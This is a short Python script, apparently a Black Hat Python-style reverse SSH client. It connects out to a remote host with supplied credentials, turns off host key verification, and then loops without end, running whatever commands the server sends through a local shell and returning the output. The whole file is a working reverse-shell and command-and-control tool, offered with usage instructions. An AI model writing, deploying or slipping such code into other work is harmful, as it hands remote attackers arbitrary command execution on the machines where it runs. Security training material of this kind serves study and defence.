#!/usr/bin/env python

import subprocess
import sys

import paramiko


def ssh_command(host, user, passwd, command, port=22):
    '''
    Connect by SSH to a host server with username and password and
    :param host:
    :param user: Username
    :param passwd: Password
    :param command: Shell command to exectute on the local host.
    :param port: Default SSH port 22
    :return: Nothing
    '''
    client = paramiko.SSHClient()
    # client.load_host_keys('/user/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(hostname=host, port=port, username=user, password=passwd)
    ssh_session = client.get_transport().open_session()
    if ssh_session.active:
        ssh_session.send(command)
        print(ssh_session.recv(1024))  # read banner
        while True:
            command = ssh_session.recv(1024)  # get command from SSH server
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except Exception as e:
                ssh_session.send(e)
        client.close()  # unreachable
    return


if __name__ == "__main__":
    if len(sys.argv) != 6:
        print("Usage: python bh_sshRcmd.py HOST PORT USER PASSWORD COMMAND")
        print("Example: python bh_sshRcmd.py 127.0.0.1 22 user secret123 ClientConnected")
        sys.exit(1)
    remote_host = sys.argv[1]
    remote_port = sys.argv[2]
    user = sys.argv[3]
    password = sys.argv[4]
    command = sys.argv[5]

    ssh_command(remote_host, user=user, passwd=password, command=command, port=remote_port)
